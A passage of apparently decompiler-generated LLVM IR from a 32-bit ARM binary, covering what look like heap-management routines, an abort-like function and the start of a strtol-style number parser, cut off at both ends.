  %v9_1273c = icmp eq i32 %v3_12738, %v2_12730
  %v1_12740 = add i32 %v2_12730, 12
  %v2_12740 = inttoptr i32 %v1_12740 to i32*
  %v3_12740 = load i32, i32* %v2_12740, align 4
  store i32 %v3_12740, i32* %r0.global-to-local, align 4
  br i1 %v9_1273c, label %dec_label_pc_12748, label %dec_label_pc_127ac

dec_label_pc_12748:                               ; preds = %dec_label_pc_1272c
  %v1_12748 = add i32 %v3_12740, 8
  %v2_12748 = inttoptr i32 %v1_12748 to i32*
  %v3_12748 = load i32, i32* %v2_12748, align 4
  store i32 %v3_12748, i32* %r3.global-to-local, align 4
  %v9_1274c = icmp eq i32 %v3_12748, %v2_12730
  br i1 %v9_1274c, label %dec_label_pc_12754, label %dec_label_pc_127ac

dec_label_pc_12754:                               ; preds = %dec_label_pc_12748
  store i32 %v3_12734, i32* %v2_12748, align 4
  %v0_12758 = load i32, i32* %r0.global-to-local, align 4
  %v1_12758 = load i32, i32* %r2.global-to-local, align 4
  %v2_12758 = add i32 %v1_12758, 12
  %v3_12758 = inttoptr i32 %v2_12758 to i32*
  store i32 %v0_12758, i32* %v3_12758, align 4
  %v0_1275c = load i32, i32* %ip.global-to-local, align 4
  %v1_1275c = load i32, i32* %r1.global-to-local, align 4
  %v2_1275c = add i32 %v1_1275c, %v0_1275c
  store i32 %v2_1275c, i32* %ip.global-to-local, align 4
  %v0_1276c.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_12770.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_12760

dec_label_pc_12760:                               ; preds = %dec_label_pc_12710, %dec_label_pc_12754
  %v0_127ec = phi i32 [ %v1_1271c, %dec_label_pc_12710 ], [ %v2_1275c, %dec_label_pc_12754 ]
  %v0_12770 = phi i32 [ %v3_12724, %dec_label_pc_12710 ], [ %v0_12770.pre, %dec_label_pc_12754 ]
  %v1_12784 = phi i32 [ %v2_1271c, %dec_label_pc_12710 ], [ %v0_1276c.pre, %dec_label_pc_12754 ]
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_12764 = load i32, i32* @r7, align 4
  %v2_12764 = add i32 %v0_12764, 32
  %v3_12764 = inttoptr i32 %v2_12764 to i32*
  %v4_12764 = load i32, i32* %v3_12764, align 4
  store i32 %v4_12764, i32* %r2.global-to-local, align 4
  %v1_12768 = add i32 %v4_12764, 44
  %v2_12768 = inttoptr i32 %v1_12768 to i32*
  %v3_12768 = load i32, i32* %v2_12768, align 4
  store i32 %v3_12768, i32* %r3.global-to-local, align 4
  %v9_1276c = icmp eq i32 %v1_12784, %v3_12768
  %v1_12770 = and i32 %v0_12770, -4
  store i32 %v1_12770, i32* %r0.global-to-local, align 4
  br i1 %v9_1276c, label %dec_label_pc_127ec, label %dec_label_pc_12778

dec_label_pc_12778:                               ; preds = %dec_label_pc_12760
  %v2_12778 = add i32 %v1_12784, %v1_12770
  store i32 %v2_12778, i32* %r3.global-to-local, align 4
  %v1_1277c = add i32 %v2_12778, 4
  %v2_1277c = inttoptr i32 %v1_1277c to i32*
  %v3_1277c = load i32, i32* %v2_1277c, align 4
  store i32 %v3_1277c, i32* %r3.global-to-local, align 4
  %v1_12780 = urem i32 %v3_1277c, 2
  %v2_12780 = icmp eq i32 %v1_12780, 0
  %v2_12784 = add i32 %v1_12784, 4
  %v3_12784 = inttoptr i32 %v2_12784 to i32*
  store i32 %v1_12770, i32* %v3_12784, align 4
  br i1 %v2_12780, label %dec_label_pc_1278c, label %dec_label_pc_12778.dec_label_pc_127bc_crit_edge

dec_label_pc_12778.dec_label_pc_127bc_crit_edge:  ; preds = %dec_label_pc_12778
  %v0_127cc.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_127bc

dec_label_pc_1278c:                               ; preds = %dec_label_pc_12778
  %v0_1278c = load i32, i32* %lr.global-to-local, align 4
  %v1_1278c = add i32 %v0_1278c, 8
  %v2_1278c = inttoptr i32 %v1_1278c to i32*
  %v3_1278c = load i32, i32* %v2_1278c, align 4
  store i32 %v3_1278c, i32* %r1.global-to-local, align 4
  %v1_12790 = add i32 %v3_1278c, 12
  %v2_12790 = inttoptr i32 %v1_12790 to i32*
  %v3_12790 = load i32, i32* %v2_12790, align 4
  store i32 %v3_12790, i32* %r3.global-to-local, align 4
  %v9_12794 = icmp eq i32 %v3_12790, %v0_1278c
  %v1_12798 = add i32 %v0_1278c, 12
  %v2_12798 = inttoptr i32 %v1_12798 to i32*
  %v3_12798 = load i32, i32* %v2_12798, align 4
  store i32 %v3_12798, i32* %r2.global-to-local, align 4
  br i1 %v9_12794, label %dec_label_pc_127a0, label %dec_label_pc_127ac

dec_label_pc_127a0:                               ; preds = %dec_label_pc_1278c
  %v1_127a0 = add i32 %v3_12798, 8
  %v2_127a0 = inttoptr i32 %v1_127a0 to i32*
  %v3_127a0 = load i32, i32* %v2_127a0, align 4
  store i32 %v3_127a0, i32* %r3.global-to-local, align 4
  %v9_127a4 = icmp eq i32 %v3_127a0, %v0_1278c
  br i1 %v9_127a4, label %dec_label_pc_127b0, label %dec_label_pc_127ac

dec_label_pc_127ac:                               ; preds = %dec_label_pc_1278c, %dec_label_pc_12748, %dec_label_pc_1272c, %dec_label_pc_127a0
  %v0_127ac = call i32 @function_128ec()
  store i32 %v0_127ac, i32* %r0.global-to-local, align 4
  %v0_127b0.pre = load i32, i32* @r1, align 4
  %v1_127b0.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_127b0

dec_label_pc_127b0:                               ; preds = %dec_label_pc_127a0, %dec_label_pc_127ac
  %v1_127b0 = phi i32 [ %v3_12798, %dec_label_pc_127a0 ], [ %v1_127b0.pre, %dec_label_pc_127ac ]
  %v0_127b0 = phi i32 [ %v3_1278c, %dec_label_pc_127a0 ], [ %v0_127b0.pre, %dec_label_pc_127ac ]
  %v2_127b0 = add i32 %v1_127b0, 8
  %v3_127b0 = inttoptr i32 %v2_127b0 to i32*
  store i32 %v0_127b0, i32* %v3_127b0, align 4
  %v0_127b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_127b4 = load i32, i32* %r1.global-to-local, align 4
  %v2_127b4 = add i32 %v1_127b4, 12
  %v3_127b4 = inttoptr i32 %v2_127b4 to i32*
  store i32 %v0_127b4, i32* %v3_127b4, align 4
  %v0_127b8 = load i32, i32* %ip.global-to-local, align 4
  %v1_127b8 = load i32, i32* %r0.global-to-local, align 4
  %v2_127b8 = add i32 %v1_127b8, %v0_127b8
  store i32 %v2_127b8, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_127bc

dec_label_pc_127bc:                               ; preds = %dec_label_pc_12778.dec_label_pc_127bc_crit_edge, %dec_label_pc_127b0
  %v0_127cc = phi i32 [ %v0_127cc.pre, %dec_label_pc_12778.dec_label_pc_127bc_crit_edge ], [ %v2_127b8, %dec_label_pc_127b0 ]
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_127c0 = load i32, i32* @r7, align 4
  %v2_127c0 = add i32 %v0_127c0, 32
  %v3_127c0 = inttoptr i32 %v2_127c0 to i32*
  %v4_127c0 = load i32, i32* %v3_127c0, align 4
  %v1_127c4 = add i32 %v4_127c0, 52
  store i32 %v1_127c4, i32* %r3.global-to-local, align 4
  %v1_127c8 = add i32 %v4_127c0, 60
  %v2_127c8 = inttoptr i32 %v1_127c8 to i32*
  %v3_127c8 = load i32, i32* %v2_127c8, align 4
  store i32 %v3_127c8, i32* %r1.global-to-local, align 4
  %v1_127cc = or i32 %v0_127cc, 1
  store i32 %v1_127cc, i32* %r2.global-to-local, align 4
  %v1_127d0 = load i32, i32* %r4.global-to-local, align 4
  %v2_127d0 = add i32 %v1_127d0, 12
  %v3_127d0 = inttoptr i32 %v2_127d0 to i32*
  store i32 %v1_127c4, i32* %v3_127d0, align 4
  %v0_127d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_127d4 = load i32, i32* %r4.global-to-local, align 4
  %v2_127d4 = add i32 %v1_127d4, 8
  %v3_127d4 = inttoptr i32 %v2_127d4 to i32*
  store i32 %v0_127d4, i32* %v3_127d4, align 4
  %v0_127d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_127d8 = load i32, i32* %r4.global-to-local, align 4
  %v2_127d8 = add i32 %v1_127d8, 4
  %v3_127d8 = inttoptr i32 %v2_127d8 to i32*
  store i32 %v0_127d8, i32* %v3_127d8, align 4
  %v0_127dc = load i32, i32* %ip.global-to-local, align 4
  %v1_127dc = load i32, i32* %r4.global-to-local, align 4
  %v3_127dc = add i32 %v1_127dc, %v0_127dc
  %v4_127dc = inttoptr i32 %v3_127dc to i32*
  store i32 %v0_127dc, i32* %v4_127dc, align 4
  %v0_127e0 = load i32, i32* %r4.global-to-local, align 4
  %v1_127e0 = load i32, i32* %r1.global-to-local, align 4
  %v2_127e0 = add i32 %v1_127e0, 12
  %v3_127e0 = inttoptr i32 %v2_127e0 to i32*
  store i32 %v0_127e0, i32* %v3_127e0, align 4
  %v0_127e4 = load i32, i32* %r4.global-to-local, align 4
  %v1_127e4 = load i32, i32* %r3.global-to-local, align 4
  %v2_127e4 = add i32 %v1_127e4, 8
  %v3_127e4 = inttoptr i32 %v2_127e4 to i32*
  store i32 %v0_127e4, i32* %v3_127e4, align 4
  br label %dec_label_pc_127fc

dec_label_pc_127ec:                               ; preds = %dec_label_pc_12760
  %v2_127ec = add i32 %v1_12770, %v0_127ec
  store i32 %v2_127ec, i32* %ip.global-to-local, align 4
  %v1_127f0 = or i32 %v2_127ec, 1
  store i32 %v1_127f0, i32* %r3.global-to-local, align 4
  %v0_127f4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_127f4, i32* %v2_12768, align 4
  %v0_127f8 = load i32, i32* %r3.global-to-local, align 4
  %v1_127f8 = load i32, i32* %r4.global-to-local, align 4
  %v2_127f8 = add i32 %v1_127f8, 4
  %v3_127f8 = inttoptr i32 %v2_127f8 to i32*
  store i32 %v0_127f8, i32* %v3_127f8, align 4
  br label %dec_label_pc_127fc

dec_label_pc_127fc:                               ; preds = %dec_label_pc_127bc, %dec_label_pc_127ec
  %v0_127fc = load i32, i32* %ip.global-to-local, align 4
  %v3_12800 = icmp ult i32 %v0_127fc, 131070
  br i1 %v3_12800, label %dec_label_pc_1286c, label %dec_label_pc_12804

dec_label_pc_12804:                               ; preds = %dec_label_pc_127fc
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_12808 = load i32, i32* @r7, align 4
  %v2_12808 = add i32 %v0_12808, 32
  %v3_12808 = inttoptr i32 %v2_12808 to i32*
  %v4_12808 = load i32, i32* %v3_12808, align 4
  store i32 %v4_12808, i32* @r4, align 4
  %v1_1280c = inttoptr i32 %v4_12808 to i32*
  %v2_1280c = load i32, i32* %v1_1280c, align 4
  store i32 %v2_1280c, i32* %r3.global-to-local, align 4
  %v1_12810 = and i32 %v2_1280c, 2
  %v2_12810 = icmp eq i32 %v1_12810, 0
  br i1 %v2_12810, label %bb15, label %bb

bb:                                               ; preds = %dec_label_pc_12804
  store i32 %v4_12808, i32* %r0.global-to-local, align 4
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_12804, %bb
  store i32 75804, i32* @lr, align 4
  %v1_12818 = xor i1 %v2_12810, true
  call void @__pseudo_cond_branch(i1 %v1_12818, i32 ptrtoint (i32* @global_var_124bc.352 to i32))
  %v0_1281c = load i32, i32* @r4, align 4
  %v1_1281c = add i32 %v0_1281c, 44
  %v2_1281c = inttoptr i32 %v1_1281c to i32*
  %v3_1281c = load i32, i32* %v2_1281c, align 4
  store i32 %v3_1281c, i32* %r3.global-to-local, align 4
  %v1_12820 = add i32 %v3_1281c, 4
  %v2_12820 = inttoptr i32 %v1_12820 to i32*
  %v3_12820 = load i32, i32* %v2_12820, align 4
  store i32 %v3_12820, i32* %r3.global-to-local, align 4
  %v1_12824 = add i32 %v0_1281c, 836
  %v2_12824 = inttoptr i32 %v1_12824 to i32*
  %v3_12824 = load i32, i32* %v2_12824, align 4
  store i32 %v3_12824, i32* %r2.global-to-local, align 4
  %v1_12828 = and i32 %v3_12820, -4
  store i32 %v1_12828, i32* %r3.global-to-local, align 4
  %v3_1282c = icmp ult i32 %v1_12828, %v3_12824
  br i1 %v3_1282c, label %dec_label_pc_1286c, label %dec_label_pc_12834

dec_label_pc_12834:                               ; preds = %bb15
  store i32 %v0_1281c, i32* %r1.global-to-local, align 4
  %v1_12838 = add i32 %v0_1281c, 840
  %v2_12838 = inttoptr i32 %v1_12838 to i32*
  %v3_12838 = load i32, i32* %v2_12838, align 4
  store i32 %v3_12838, i32* %r0.global-to-local, align 4
  %v2_1283c = call i32 @function_1240c(i32 %v3_12838, i32 %v0_1281c)
  store i32 %v2_1283c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1286c

dec_label_pc_12844:                               ; preds = %dec_label_pc_12708
  %v2_12844 = inttoptr i32 %v1_126d8 to i32*
  %v3_12844 = load i32, i32* %v2_12844, align 4
  store i32 %v3_12844, i32* %r0.global-to-local, align 4
  %v1_12848 = add i32 %v4_126c8, 848
  %v2_12848 = inttoptr i32 %v1_12848 to i32*
  %v3_12848 = load i32, i32* %v2_12848, align 4
  store i32 %v3_12848, i32* %r2.global-to-local, align 4
  %v1_1284c = add i32 %v4_126c8, 868
  %v2_1284c = inttoptr i32 %v1_1284c to i32*
  %v3_1284c = load i32, i32* %v2_1284c, align 4
  %v2_12850 = add i32 %v3_12844, %v1_126d4
  store i32 %v2_12850, i32* %r1.global-to-local, align 4
  %v1_12854 = add i32 %v3_12848, -1
  store i32 %v1_12854, i32* %r2.global-to-local, align 4
  %v2_12858 = sub i32 %v3_1284c, %v2_12850
  store i32 %v2_12858, i32* %r3.global-to-local, align 4
  store i32 %v2_12858, i32* %v2_1284c, align 4
  %v1_12860 = load i32, i32* @lr, align 4
  %v2_12860 = add i32 %v1_12860, 848
  %v3_12860 = inttoptr i32 %v2_12860 to i32*
  store i32 %v1_12854, i32* %v3_12860, align 4
  %v0_12864 = load i32, i32* %r0.global-to-local, align 4
  %v1_12864 = load i32, i32* @r5, align 4
  %v2_12864 = sub i32 %v1_12864, %v0_12864
  store i32 %v2_12864, i32* %r0.global-to-local, align 4
  %v4_12868 = call i32 @function_13e54(i32 %v2_12864, i32 %v2_12850, i32 %v1_12854, i32 %v2_12858)
  store i32 %v4_12868, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1286c

dec_label_pc_1286c:                               ; preds = %bb15, %dec_label_pc_127fc, %dec_label_pc_12834, %dec_label_pc_126e8, %dec_label_pc_12844
  store i32 %v2_1267c, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v0_12878 = load i32, i32* @r7, align 4
  %v2_12878 = add i32 %v0_12878, 24
  %v3_12878 = inttoptr i32 %v2_12878 to i32*
  %v4_12878 = load i32, i32* %v3_12878, align 4
  store i32 %v4_12878, i32* @ip, align 4
  store i32 75908, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12878)
  br label %dec_label_pc_12884

dec_label_pc_12884:                               ; preds = %dec_label_pc_12670, %dec_label_pc_1286c
  store i32 %v3_12670, i32* @r4, align 4
  store i32 %v6_12670, i32* @r5, align 4
  store i32 %v9_12670, i32* @r6, align 4
  store i32 %v12_12670, i32* @r7, align 4
  store i32 %v18_12670, i32* @lr, align 4
  ret i32 %v2_1267c

; uselistorder directives
  uselistorder i32 %v0_1281c, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_127dc, { 1, 0 }
  uselistorder i32 %v1_1271c, { 1, 0 }
  uselistorder i32 %v0_1271c, { 1, 0 }
  uselistorder i32 %v3_126f0, { 1, 0 }
  uselistorder i32 %v1_126d4, { 1, 0, 2 }
  uselistorder i32 %v2_126d0, { 1, 2, 0, 3 }
  uselistorder i32 %v4_126c8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_12678, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %r0.global-to-local, { 4, 14, 1, 2, 3, 0, 5, 6, 12, 13, 7, 8, 9, 11, 10 }
  uselistorder i32* %ip.global-to-local, { 4, 0, 5, 1, 6, 3, 2, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 868, { 2, 0, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_12884, { 1, 0 }
  uselistorder label %dec_label_pc_1286c, { 4, 2, 0, 1, 3 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %dec_label_pc_127fc, { 1, 0 }
  uselistorder label %dec_label_pc_127bc, { 1, 0 }
  uselistorder label %dec_label_pc_127b0, { 1, 0 }
  uselistorder label %dec_label_pc_127ac, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_12760, { 1, 0 }
}

define i32 @function_12894(i32 %arg1) local_unnamed_addr {
dec_label_pc_12894:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_12894 = load i1, i1* @cpsr_z, align 1
  %v2_12894 = load i32, i32* @r4, align 4
  br i1 %v0_12894, label %bb, label %dec_label_pc_12894..thread4_crit_edge

dec_label_pc_12894..thread4_crit_edge:            ; preds = %dec_label_pc_12894
  %v0_128c0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread4

bb:                                               ; preds = %dec_label_pc_12894
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_12894..thread4_crit_edge, %bb
  %v0_128c0 = phi i32 [ %v0_128c0.pre, %dec_label_pc_12894..thread4_crit_edge ], [ 0, %bb ]
  store i32 %v2_12894, i32* %stack_var_-12, align 4
  %v6_128ac = load i32, i32* @r5, align 4
  %v9_128ac = load i32, i32* @lr, align 4
  %v4_128bc = load i32, i32* inttoptr (i32 124120 to i32*), align 8
  store i32 %v4_128bc, i32* @r5, align 4
  store i32 %v0_128c0, i32* @r4, align 4
  store i32 %v4_128bc, i32* @r0, align 4
  %v0_128cc = call i32 @function_124bc()
  %v0_128d0 = load i32, i32* @r4, align 4
  store i32 %v0_128d0, i32* %r0.global-to-local, align 4
  %v0_128d4 = load i32, i32* @r5, align 4
  %v2_128dc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_128dc, i32* @r4, align 4
  store i32 %v6_128ac, i32* @r5, align 4
  store i32 %v9_128ac, i32* @lr, align 4
  %v2_128e0 = call i32 @function_1240c(i32 %v0_128d0, i32 %v0_128d4)
  store i32 %v2_128e0, i32* %r0.global-to-local, align 4
  %v0_128e4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_128e4, label %bb13, label %.thread5

bb13:                                             ; preds = %.thread4
  %v1_128e4 = load i32, i32* @fp, align 4
  %v4_128e4 = inttoptr i32 %v2_128e0 to i32*
  store i32 %v1_128e4, i32* %v4_128e4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread5

.thread5:                                         ; preds = %.thread4, %bb13
  %v4_128e8 = phi i32 [ %v2_128e0, %.thread4 ], [ 0, %bb13 ]
  ret i32 %v4_128e8

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 5, 3, 4, 0, 1 }
  uselistorder i32 (i32, i32)* @function_1240c, { 1, 0 }
  uselistorder i32 ()* @function_124bc, { 3, 2, 0, 1 }
  uselistorder i32* inttoptr (i32 124120 to i32*), { 17, 2, 1, 7, 8, 9, 10, 11, 6, 12, 5, 13, 0, 14, 15, 4, 16, 3 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @function_128ec() local_unnamed_addr {
dec_label_pc_128ec:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 124088, i32* @r5, align 4
  %v4_12904 = load i32, i32* inttoptr (i32 124104 to i32*), align 8
  store i32 76048, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_12904)
  %v2_12920 = ptrtoint i32* %stack_var_-8 to i32
  store i32 32, i32* %stack_var_-8, align 4
  %v3_1292c = call i32 @function_10ba8(i32 1, i32 %v2_12920, i32 0)
  %v4_12934 = load i32, i32* @global_var_1e750.360, align 4
  %v2_12938 = icmp eq i32 %v4_12934, 0
  br i1 %v2_12938, label %dec_label_pc_12940, label %dec_label_pc_12980

dec_label_pc_12940:                               ; preds = %dec_label_pc_128ec
  store i32 1, i32* @global_var_1e750.360, align 4
  br label %dec_label_pc_12948

dec_label_pc_12948:                               ; preds = %dec_label_pc_12990, %dec_label_pc_12940
  %v0_1294c = load i32, i32* @r5, align 4
  %v2_1294c = add i32 %v0_1294c, 160
  store i32 %v2_1294c, i32* @r4, align 4
  %v2_12958 = add i32 %v0_1294c, 36
  %v3_12958 = inttoptr i32 %v2_12958 to i32*
  %v4_12958 = load i32, i32* %v3_12958, align 4
  call void @__pseudo_branch(i32 %v4_12958)
  %v1_12968 = call i32 @function_113f4(i32 6)
  %v0_12974 = load i32, i32* @r5, align 4
  %v2_12974 = add i32 %v0_12974, 16
  %v3_12974 = inttoptr i32 %v2_12974 to i32*
  %v4_12974 = load i32, i32* %v3_12974, align 4
  store i32 76160, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_12974)
  %v4_12984.pre = load i32, i32* @global_var_1e750.360, align 4
  br label %dec_label_pc_12980

dec_label_pc_12980:                               ; preds = %dec_label_pc_128ec, %dec_label_pc_12948
  %v0_12994 = phi i32 [ %v4_12934, %dec_label_pc_128ec ], [ %v4_12984.pre, %dec_label_pc_12948 ]
  %v7_12988 = icmp eq i32 %v0_12994, 1
  br i1 %v7_12988, label %dec_label_pc_12990, label %dec_label_pc_129cc

dec_label_pc_12990:                               ; preds = %dec_label_pc_12980
  %v2_12990 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_12990, i32* @r4, align 4
  store i32 2, i32* @global_var_1e750.360, align 4
  store i32 20, i32* @r2, align 4
  %v2_129a8 = bitcast i32* %stack_var_-28 to i8*
  %v3_129a8 = call i32 @function_11060(i8* %v2_129a8, i32 0)
  %v3_129c4 = call i32 @function_13954(i32 6, i32 %v2_12990, i32 0)
  br label %dec_label_pc_12948

dec_label_pc_129cc:                               ; preds = %dec_label_pc_12980
  %v7_129cc = icmp eq i32 %v0_12994, 2
  br i1 %v7_129cc, label %dec_label_pc_129d4, label %dec_label_pc_129e0

dec_label_pc_129d4:                               ; preds = %dec_label_pc_129cc
  store i32 3, i32* @global_var_1e750.360, align 4
  %v0_129dc = call i32 @function_128ec()
  %v4_129e0.pre = load i32, i32* @global_var_1e750.360, align 4
  br label %dec_label_pc_129e0

dec_label_pc_129e0:                               ; preds = %dec_label_pc_129cc, %dec_label_pc_129d4
  %v1_129e8 = phi i32 [ %v0_12994, %dec_label_pc_129cc ], [ %v4_129e0.pre, %dec_label_pc_129d4 ]
  %v7_129e4 = icmp eq i32 %v1_129e8, 3
  br i1 %v7_129e4, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_129e0
  store i32 4, i32* @global_var_1e750.360, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_129e0, %bb
  call void @__pseudo_cond_branch(i1 %v7_129e4, i32 ptrtoint (i32* @global_var_13f44.362 to i32))
  br label %dec_label_pc_129f8

dec_label_pc_129f8:                               ; preds = %dec_label_pc_129f8, %.thread1
  %v0_129f8 = call i32 @function_128ec()
  br label %dec_label_pc_129f8

; uselistorder directives
  uselistorder i32 ()* @function_128ec, { 1, 0, 5, 4, 6, 3, 2 }
  uselistorder i32 6, { 14, 15, 75, 3, 32, 16, 17, 28, 18, 29, 19, 30, 20, 31, 1, 33, 21, 34, 0, 4, 35, 36, 22, 37, 5, 38, 39, 40, 23, 41, 6, 42, 43, 44, 24, 45, 46, 47, 25, 48, 49, 50, 51, 7, 52, 53, 54, 55, 8, 56, 57, 58, 59, 60, 26, 61, 9, 62, 63, 64, 65, 66, 67, 27, 68, 10, 69, 70, 71, 72, 11, 73, 12, 13, 2, 74 }
  uselistorder i32* @global_var_1e750.360, { 2, 0, 3, 4, 1, 5, 6 }
  uselistorder i32* inttoptr (i32 124104 to i32*), { 2, 0, 1 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_129e0, { 1, 0 }
  uselistorder label %dec_label_pc_12980, { 1, 0 }
}

define i32 @function_12a04(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12a04:
  %v0_12a04 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12a04, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_12a04
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_12a04, %bb
  %v4_12a10 = phi i32 [ %arg1, %dec_label_pc_12a04 ], [ 0, %bb ]
  ret i32 %v4_12a10

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_12a14(i32 %arg1) local_unnamed_addr {
dec_label_pc_12a14:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_12a24 = call i32 @function_12a34()
  ret i32 %v0_12a24
}

define i32 @function_12a34() local_unnamed_addr {
dec_label_pc_12a34:
  store i32 1, i32* @r3, align 4
  %v0_12a40 = call i32 @function_12a50()
  ret i32 %v0_12a40
}

define i32 @function_12a50() local_unnamed_addr {
dec_label_pc_12a50:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %v3_12a50 = load i32, i32* @r4, align 4
  %v12_12a50 = load i32, i32* @r7, align 4
  store i32 224, i32* @lr, align 4
  store i32 124088, i32* %ip.global-to-local, align 4
  %v0_12a64 = load i32, i32* @r1, align 4
  store i32 %v0_12a64, i32* %fp.global-to-local, align 4
  %v0_12a68 = load i32, i32* @r2, align 4
  store i32 %v0_12a68, i32* %r5.global-to-local, align 4
  %v0_12a6c = load i32, i32* @r0, align 4
  store i32 %v0_12a6c, i32* @r4, align 4
  %v0_12a70 = load i32, i32* @r3, align 4
  br label %dec_label_pc_12a7c

dec_label_pc_12a78:                               ; preds = %dec_label_pc_12a7c
  %v1_12a78 = add i32 %v0_12ab4, 1
  store i32 %v1_12a78, i32* @r4, align 4
  br label %dec_label_pc_12a7c

dec_label_pc_12a7c:                               ; preds = %dec_label_pc_12a50, %dec_label_pc_12a78
  %v0_12ab4 = phi i32 [ %v0_12a6c, %dec_label_pc_12a50 ], [ %v1_12a78, %dec_label_pc_12a78 ]
  %v1_12a7c = inttoptr i32 %v0_12ab4 to i8*
  %v2_12a7c = load i8, i8* %v1_12a7c, align 1
  %v3_12a7c = zext i8 %v2_12a7c to i32
  %v4_12a80 = load i32, i32* inttoptr (i32 124312 to i32*), align 8
  %v2_12a84 = mul nuw nsw i32 %v3_12a7c, 2
  %v2_12a88 = add i32 %v2_12a84, %v4_12a80
  %v3_12a88 = inttoptr i32 %v2_12a88 to i16*
  %v4_12a88 = load i16, i16* %v3_12a88, align 2
  %v1_12a8c = and i16 %v4_12a88, 32
  %v2_12a8c = icmp eq i16 %v1_12a8c, 0
  br i1 %v2_12a8c, label %dec_label_pc_12a94, label %dec_label_pc_12a78

dec_label_pc_12a94:                               ; preds = %dec_label_pc_12a7c
  %v7_12a94 = icmp eq i8 %v2_12a7c, 43
  br i1 %v7_12a94, label %dec_label_pc_12ab4, label %dec_label_pc_12a9c

dec_label_pc_12a9c:                               ; preds = %dec_label_pc_12a94
  %v7_12a9c = icmp eq i8 %v2_12a7c, 45
  br i1 %v7_12a9c, label %dec_label_pc_12ab4, label %bb

bb:                                               ; preds = %dec_label_pc_12a9c
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_12ab8

dec_label_pc_12ab4:                               ; preds = %dec_label_pc_12a94, %dec_label_pc_12a9c
  %storemerge39 = phi i32 [ 1, %dec_label_pc_12a9c ], [ 0, %dec_label_pc_12a94 ]
  store i32 %storemerge39, i32* @r7, align 4
  %v1_12ab4 = add i32 %v0_12ab4, 1
  store i32 %v1_12ab4, i32* @r4, align 4
  br label %dec_label_pc_12ab8

dec_label_pc_12ab8:                               ; preds = %bb, %dec_label_pc_12ab4
  %v0_12ad8 = phi i32 [ %v0_12ab4, %bb ], [ %v1_12ab4, %dec_label_pc_12ab4 ]
  %v1_12ab8 = and i32 %v0_12a68, -17
  %v3_12ab8 = icmp eq i32 %v1_12ab8, 0
  br i1 %v3_12ab8, label %dec_label_pc_12ac4, label %bb52

bb52:                                             ; preds = %dec_label_pc_12ab8
  store i32 %v0_12a6c, i32* %r6.global-to-local, align 4
  br label %bb56

dec_label_pc_12ac4:                               ; preds = %dec_label_pc_12ab8
  %v1_12ac4 = inttoptr i32 %v0_12ad8 to i8*
  %v2_12ac4 = load i8, i8* %v1_12ac4, align 1
  %v7_12ac8 = icmp eq i8 %v2_12ac4, 48
  %v1_12acc = add i32 %v0_12a68, 10
  store i32 %v1_12acc, i32* %r5.global-to-local, align 4
  br i1 %v7_12ac8, label %dec_label_pc_12ad8, label %bb53

bb53:                                             ; preds = %dec_label_pc_12ac4
  store i32 %v0_12a6c, i32* %r6.global-to-local, align 4
  br label %.thread8

dec_label_pc_12ad8:                               ; preds = %dec_label_pc_12ac4
  %v1_12ad8 = add i32 %v0_12ad8, 1
